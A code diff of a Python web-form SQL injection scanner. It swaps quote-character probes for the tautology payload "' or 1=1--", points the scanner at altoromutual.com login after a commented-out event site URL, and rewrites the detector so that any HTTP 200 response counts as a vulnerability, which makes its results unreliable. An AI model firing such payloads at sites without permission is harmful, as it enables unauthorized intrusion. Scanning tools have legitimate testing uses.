@@ -15,7 +15,7 @@ def form_details(form):
     inputs = []
 
     for input_tag in form.find_all("input"):
-        input_type = input_tag.attrs.get("type", "text")
+        input_type = input_tag.attrs.get("type", "password") or input_tag.attrs.get("type", "text")
         input_name = input_tag.attrs.get("name")
         input_value = input_tag.attrs.get("value", "")
         inputs.append({
@@ -27,11 +27,7 @@ def form_details(form):
     return {'action': action, 'method': method, 'inputs': inputs}
 
 def vulnerable(response):
-    errors = {"quoted string not properly terminated", 
-              "unclosed quotation mark after the charachter string",
-              "you have an error in you SQL syntax" 
-             }
-    return any(error in response.content.decode().lower() for error in errors)
+    return response.status_code == 200 or response.ok
 
 def sql_injection_scan(url):
     forms = get_forms(url)
@@ -39,16 +35,13 @@ def sql_injection_scan(url):
     for form in forms:
         details = form_details(form)
 
-        for i in "\"'":
+        for i in ["' or 1=1--"]:
             data = {}
             for input_tag in details["inputs"]:
-                if input_tag["type"] == "hidden" or input_tag["value"]:
+                if input_tag["type"] == "hidden":
                     data[input_tag['name']] = input_tag["value"] + i
                 elif input_tag["type"] != "submit":
-                    data[input_tag['name']] = f"test{i}"
-
-            print(url)
-            form_details(form)
+                    data[input_tag['name']] = f"{i}"
 
             if details["method"] == "post":
                 res = s.post(url, data=data)
@@ -58,9 +51,10 @@ def sql_injection_scan(url):
                 messages.add(f"SQL injection attack vulnerability in link: {url}")
             else:
                 messages.add("No SQL injection attack vulnerability detected")
-                break
     return messages
 
 if __name__ == "__main__":
-    urlToBeChecked = "http://olympicology.com/events/madrid-ch2/"
-    sql_injection_scan(urlToBeChecked)
+    # urlToBeChecked = "http://olympicology.com/events/madrid-ch2/"
+    urlToBeChecked = "http://altoromutual.com:8080/login.jsp"
+    res = sql_injection_scan(urlToBeChecked)
+    print(res)
